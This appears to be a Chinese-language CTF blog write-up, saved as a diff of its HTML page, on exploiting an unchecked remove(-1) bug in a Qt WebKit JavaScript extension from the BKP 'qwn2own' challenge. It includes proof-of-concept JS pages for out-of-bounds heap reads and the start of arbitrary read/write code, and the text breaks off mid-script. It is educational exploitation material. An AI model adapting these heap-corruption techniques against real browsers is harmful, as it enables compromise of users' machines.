@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="manifest" href="/manifest.json">
+  <link rel="apple-touch-startup-image" href="images/hexo.png">
+  <link rel="apple-touch-icon" href="images/icons/icon-72x72.png">
+<link rel="apple-touch-icon" sizes="152x152" href="images/icons/icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="images/icons/icon-192x192.png">
+<link rel="apple-touch-icon" sizes="167x167" href="images/icons/icon-192x192.png">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    JS Engine Exploit-qwn2own |
+    
+    Migraine</title>
+  
+    <link rel="shortcut icon" href="/fujiang.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-qwn2own" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      JS Engine Exploit-qwn2own
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/20/qwn2own/" class="article-date">
+  <time datetime="2019-12-20T11:14:04.000Z" itemprop="datePublished">2019-12-20</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>题目来源:BPK CTF -  <a href="https://github.com/migraine-sudo/PWN-/raw/master/%E5%AE%9E%E4%BE%8BPNW%E9%A2%98/3.HEAP/qwn2own.tar" target="_blank" rel="noopener">qwn2own</a></p>
+<p>概述:第一次打浏览器的PWN，也是期末前最后一次Exploit。漏洞存在于JS引擎的扩展，JS引擎则是webkit自带的javascriptcore。题目的所有防护机制都是开启的，最后除了传统利用方法泄露地址，利用JIT Page写来绕过DEP是比较有意思的部分。</p>
+<a id="more"></a>
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/veZzlT.png" alt="veZzlT"> </p>
+<p>运行这个程序，我们打开一个主办方写的浏览器。要求我们编写对该浏览器进行漏洞利用的js代码，并且弹出一个计算器。</p>
+<p><em>Target浏览器运行效果</em></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/NWBbuv.png" alt="NWBbuv"> </p>
+<p>题目描述：</p>
+<blockquote>
+<p>The BKP Database JavasScript API allows users to store data that can be kept hidden from other users.This allows web applications to share one web context between multiple users but yet still be able to storesensitive information pertaining to each user and keep it secret from the others.</p>
+<p>更多部分看官方的API文档</p>
+</blockquote>
+<p>这个Browser大概是出题人用QTwebkit内核写出的简易浏览器，主办方写了一个外部的扩展（JS Extension），题目描述的就是这个插件。</p>
+<p>同时这个漏洞存在于插件中（如果能挖到webkit/jscore漏洞的话还不去申请CVE？）</p>
+<p>主办方还给出了API接口文档,速读一下获取这个扩展功能的全貌。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/n7wDmG.png" alt="n7wDmG"> </p>
+<h2 id="0-前置知识"><a href="#0-前置知识" class="headerlink" title="0.前置知识"></a>0.前置知识</h2><p>QT WebKit <a href="https://doc.qt.io/archives/qt-5.5/qtwebkitwidgets-index.html" target="_blank" rel="noopener">https://doc.qt.io/archives/qt-5.5/qtwebkitwidgets-index.html</a></p>
+<p>QT-WebKit是一个将Webkit移植到QT的一个开源项目，Javascript操作的对象都是通过C++定义，漏洞存在的于C++所写的扩展中，JS在调用扩展对象时才有可能触发这个漏洞。</p>
+<p>因为笔者的C++ STL基础不够扎实，所以QT部分无法解读更多内容。（挖个坑）</p>
+<p>QT5源码:<a href="http://download.qt.io/archive/qt/5.14/" target="_blank" rel="noopener">http://download.qt.io/archive/qt/5.14/</a></p>
+<p>线上版 <a href="https://code.woboq.org/qt5/qtbase/src/corelib/tools/qvector.h.html" target="_blank" rel="noopener">https://code.woboq.org/qt5/qtbase/src/corelib/tools/qvector.h.html</a></p>
+<p>JIT基础知识（留坑）</p>
+<h2 id="1-漏洞代码"><a href="#1-漏洞代码" class="headerlink" title="1.漏洞代码"></a>1.漏洞代码</h2><p>通过访问题目提供的example.html和API文档来快速熟悉代码。当使用BKPDataBase创建数据存储，会返回一个BKInstancec对象。BKPInstance对象可以创建一个包含数组（QVector）的对象（QBJECT）BKPStore，该对象可以创建一个拥有对其存储数据的操作权。</p>
+<p>程序的BKPStore对象定义</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BKPStore</span> :</span> <span class="keyword">public</span> QObject &#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BKPStore(QObject * parent = <span class="number">0</span>, <span class="keyword">const</span> QString &amp;name = <span class="number">0</span>, quint8 tp = <span class="number">0</span>, QVariant var = <span class="number">0</span>, qulonglong store_ping = <span class="number">0</span>);</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(QVariant v)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Q_INVOKABLE QVariant <span class="title">getall</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE QVariant <span class="title">get</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">insert</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, QVariant var)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">append</span><span class="params">(QVariant var)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">cut</span><span class="params">(<span class="keyword">int</span> beg, <span class="keyword">int</span> <span class="built_in">end</span>)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    quint8 type; <span class="comment">// specifies which type to of vector</span></span><br><span class="line">                  <span class="comment">// to use</span></span><br><span class="line">    QVector&lt;QVariant&gt; varvect;</span><br><span class="line">    QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">    QVector&lt;QString&gt; strvect;</span><br><span class="line">    qulonglong store_ping;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>由于BKPStore的remove操作没有对输入参数进行限制，使用-1参数会导致erase函数对数组结构本身造成破坏，引发一个任意地址R/W漏洞。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BKPStore::<span class="built_in">remove</span>(<span class="keyword">int</span> idx)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;varvect.erase(<span class="keyword">this</span>-&gt;varvect.<span class="built_in">begin</span>() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;intvect.erase(<span class="keyword">this</span>-&gt;intvect.<span class="built_in">begin</span>() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;strvect.erase(<span class="keyword">this</span>-&gt;strvect.<span class="built_in">begin</span>() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// this doesn't happen ever</span></span><br><span class="line">        BKPException ex;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>QT中erase内联函数（/src/corelib/tools/qvector.h）定义，erase如果只有一个参数，就只会对当前值erase，而不是一个范围。</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator <span class="built_in">begin</span>, iterator <span class="built_in">end</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> iterator <span class="title">erase</span><span class="params">(iterator pos)</span> </span>&#123; <span class="keyword">return</span> erase(pos, pos+<span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>QT版本的erase的实现和标准的STL中基本一致，将erase范围内的数据删去，并且将aend以后的参数拷贝到前面新的空闲位置。(使用new或者memmove)</p>
+<p>关键问题在于这个函数也没有对输入参数的检测，如果输入的参数为-1，那么abegin=-1，aend=0，erase会将原本index为0的数据，到QVector结构的前面（index=-1）。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> QVector&lt;T&gt;::iterator QVector&lt;T&gt;::erase(iterator abegin, iterator aend)</span><br><span class="line">&#123;</span><br><span class="line">    Q_ASSERT_X(isValidIterator(abegin), <span class="string">"QVector::erase"</span>, <span class="string">"The specified iterator argument 'abegin' is invalid"</span>);</span><br><span class="line">    Q_ASSERT_X(isValidIterator(aend), <span class="string">"QVector::erase"</span>, <span class="string">"The specified iterator argument 'aend' is invalid"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> itemsToErase = aend - abegin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!itemsToErase)</span><br><span class="line">        <span class="keyword">return</span> abegin;</span><br><span class="line"></span><br><span class="line">    Q_ASSERT(abegin &gt;= d-&gt;<span class="built_in">begin</span>());</span><br><span class="line">    Q_ASSERT(aend &lt;= d-&gt;<span class="built_in">end</span>());</span><br><span class="line">    Q_ASSERT(abegin &lt;= aend);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> itemsUntouched = abegin - d-&gt;<span class="built_in">begin</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME we could do a proper realloc, which copy constructs only needed data.</span></span><br><span class="line">    <span class="comment">// FIXME we are about to delete data - maybe it is good time to shrink?</span></span><br><span class="line">    <span class="comment">// FIXME the shrink is also an issue in removeLast, that is just a copy + reduce of this.</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;alloc) &#123;</span><br><span class="line">        <span class="built_in">detach</span>();</span><br><span class="line">        abegin = d-&gt;<span class="built_in">begin</span>() + itemsUntouched;</span><br><span class="line">        aend = abegin + itemsToErase;</span><br><span class="line">        <span class="keyword">if</span> (!QTypeInfoQuery&lt;T&gt;::isRelocatable) &#123;</span><br><span class="line">            iterator moveBegin = abegin + itemsToErase;</span><br><span class="line">            iterator moveEnd = d-&gt;<span class="built_in">end</span>();</span><br><span class="line">            <span class="keyword">while</span> (moveBegin != moveEnd) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QTypeInfo&lt;T&gt;::isComplex)</span><br><span class="line">                    <span class="keyword">static_cast</span>&lt;T *&gt;(abegin)-&gt;~T();</span><br><span class="line">                <span class="keyword">new</span> (abegin++) T(*moveBegin++);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (abegin &lt; d-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="comment">// destroy rest of instances</span></span><br><span class="line">                destruct(abegin, d-&gt;<span class="built_in">end</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            destruct(abegin, aend);</span><br><span class="line">            <span class="comment">// QTBUG-53605: static_cast&lt;void *&gt; masks clang errors of the form</span></span><br><span class="line">            <span class="comment">// error: destination for this 'memmove' call is a pointer to class containing a dynamic class</span></span><br><span class="line">            <span class="comment">// FIXME maybe use std::is_polymorphic (as soon as allowed) to avoid the memmove</span></span><br><span class="line">            memmove(<span class="keyword">static_cast</span>&lt;<span class="keyword">void</span> *&gt;(abegin), <span class="keyword">static_cast</span>&lt;<span class="keyword">void</span> *&gt;(aend),</span><br><span class="line">                    (d-&gt;<span class="built_in">size</span> - itemsToErase - itemsUntouched) * <span class="keyword">sizeof</span>(T));</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;<span class="built_in">size</span> -= <span class="keyword">int</span>(itemsToErase);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d-&gt;<span class="built_in">begin</span>() + itemsUntouched;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>BKPStore对象操作对象QVector,定义了三个不同的QVector指针（对应不同的type，1对应int，2对应str，0对应var），如果忘了可以往上翻，重新看一下这个对象的定义。</p>
+<p>QVector数据结构为QArrayData</p>
+<p>头部长度24byte，offset这个值正好在array的前面。如果使用remove(-1)正好会把offset值删去，并将我们写入数组的第一个值放入offset值。（虽然实际上只能覆盖低八位，不过已经足够够了，offset值本身就用不到高8位）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Q_CORE_EXPORT</span> <span class="title">QArrayData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   QtPrivate::RefCount ref; <span class="comment">//4 byte 引用计数</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">//4 byte 大小</span></span><br><span class="line">    uint alloc : <span class="number">31</span>; <span class="comment">// 4 byte 分配大小</span></span><br><span class="line">    uint capacityReserved : <span class="number">1</span>; <span class="comment">//4byte</span></span><br><span class="line"></span><br><span class="line">    qptrdiff offset; <span class="comment">//8 byte  // in bytes from beginning of header arry距离数组的偏移</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// array starts here</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span> <span class="comment">//动态</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(<span class="built_in">size</span> == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span> <span class="keyword">const</span> <span class="comment">//静态</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(<span class="built_in">size</span> == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong></p>
+<p>通过POC可以看到，通过remove(-1) QArryData数组的第一位0覆盖了offset，</p>
+<p>然后程序将整个结构的头部打印了出来。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Poc1.html</span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"print"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">"dbname"</span>,<span class="string">"passwd"</span>);</span><br><span class="line">	var A=db.createStore(<span class="string">"db1"</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line"></span><br><span class="line">	A.<span class="built_in">remove</span>(<span class="number">-1</span>);</span><br><span class="line">	var x=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		x+=i+<span class="string">" : "</span>+A.<span class="built_in">get</span>(i).toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	document.getElementById(<span class="string">"print"</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/4lmO8B.png" alt="4lmO8B"> </p>
+<p>头部分别是ref=1 ，size因为remove所以减少了1</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0 : 900000001 1&lt;--ref  9 &lt;--size</span><br><span class="line">1 : 7faa0000000d </span><br><span class="line">2 : 0</span><br><span class="line">3 : 1</span><br><span class="line">4 : 2</span><br><span class="line">5 : 3</span><br><span class="line">6 : 4</span><br><span class="line">7 : 5</span><br><span class="line">8 : 6</span><br><span class="line">9 : 0 &lt;--size减少导致的不可读（9及以下都不可读）</span><br><span class="line">10 : 0</span><br><span class="line">11 : 0</span><br><span class="line">12 : 0</span><br><span class="line">13 : 0</span><br><span class="line">14 : 0</span><br></pre></td></tr></table></figure>
+
+<p>此时通过inset可以将size值修改为任意值，从而达到任意地址读取的效果。</p>
+<p><code>A.insert(0,0xffff000000001);</code></p>
+<p>如图所示，我们将size值改为了0xffff（还要保证ref=1，否则会被垃圾回收机制干掉），于是后面的地址都能打印出来了。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/gaRG9R.png" alt="gaRG9R"> </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">poc2.html</span><br><span class="line">&lt;div id=<span class="string">"print"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">"dbname"</span>,<span class="string">"passwd"</span>);</span><br><span class="line">	var A=db.createStore(<span class="string">"db1"</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line"></span><br><span class="line">	A.<span class="built_in">remove</span>(<span class="number">-1</span>);</span><br><span class="line">	A.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line">var x=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		x+=i+<span class="string">" : "</span>+A.<span class="built_in">get</span>(i).toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"print"</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-构造Exploit"><a href="#2-构造Exploit" class="headerlink" title="2.构造Exploit"></a>2.构造Exploit</h2><p>一些要点：Js的heap和QT（我们这次分析的）的heap是分开的，QT直接用的libc的heap。所以内存查找不用担心找到js中的key1</p>
+<p>通过匹配store_ping值，寻找C对象的BKPStore结构地址</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"print"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">"dbname"</span>,<span class="string">"passwd"</span>);</span><br><span class="line">	var key1=<span class="number">0xabcd1234</span>;</span><br><span class="line">	var B=db.createStore(<span class="string">"B"</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line">	var C=db.createStore(<span class="string">"C"</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],key1);</span><br><span class="line">	B.<span class="built_in">remove</span>(<span class="number">-1</span>);</span><br><span class="line">	B.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line"></span><br><span class="line">	var x=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//x+=i+" : "+B.get(i).toString(16)+"&lt;br&gt;";</span></span><br><span class="line">		<span class="keyword">if</span>(B.<span class="built_in">get</span>(i)==key1)&#123;</span><br><span class="line">			<span class="comment">//alert("i="+i);</span></span><br><span class="line">			<span class="keyword">for</span>(var j=i<span class="number">-10</span>;j&lt;i+<span class="number">10</span>;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				x+=j+<span class="string">" : "</span>+B.<span class="built_in">get</span>(j).toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"print"</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造两个Vector，读取另一个的虚函数表</p>
+<p>判断条件 store_ping参数 ，对照结构可以取到第二个Vector的intvect地址</p>
+<p>BKPStore结构参考</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  quint8 type; <span class="comment">// specifies which type to of vector</span></span><br><span class="line">​         <span class="comment">// to use</span></span><br><span class="line">  QVector&lt;QVariant&gt; varvect;</span><br><span class="line">  QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">  QVector&lt;QString&gt; strvect;</span><br><span class="line">  qulonglong store_ping;</span><br></pre></td></tr></table></figure>
+
+<p>JS打印出了BKPStore的结构，我们可以获取这个QVector的地址还有后文用于泄漏地址的Vtable地址。</p>
+<p>打印地址时候需要注意的是，因为创建大量的内存，heap内部空间会比较乱，很可能读取到上一次遗留/错误的地址。添加一个判断条件来保证BKPStore的正确性，必须保证读取到的strvect和varvect相等（未初始化状态），</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Jl8lBo.png" alt="Jl8lBo"> </p>
+<p>intvect的内容，指向QArrayData结构</p>
+<p>![image-20200123195257545](/Users/migraine/Library/Application Support/typora-user-images/image-20200123195257545.png)</p>
+<h3 id="2-1实现任意地址读写"><a href="#2-1实现任意地址读写" class="headerlink" title="2.1实现任意地址读写"></a>2.1实现任意地址读写</h3><p>任意地址写的思路很简单，通过控制对象C_Vector的offset大小，实现任意地址读写。修改offset的方法，只需通过BVector的越界读写修改C的offset即可</p>
+<p>实现代码</p>
+<p>使用read读取vtable的内容</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"out"</span>&gt;<span class="xml"><span 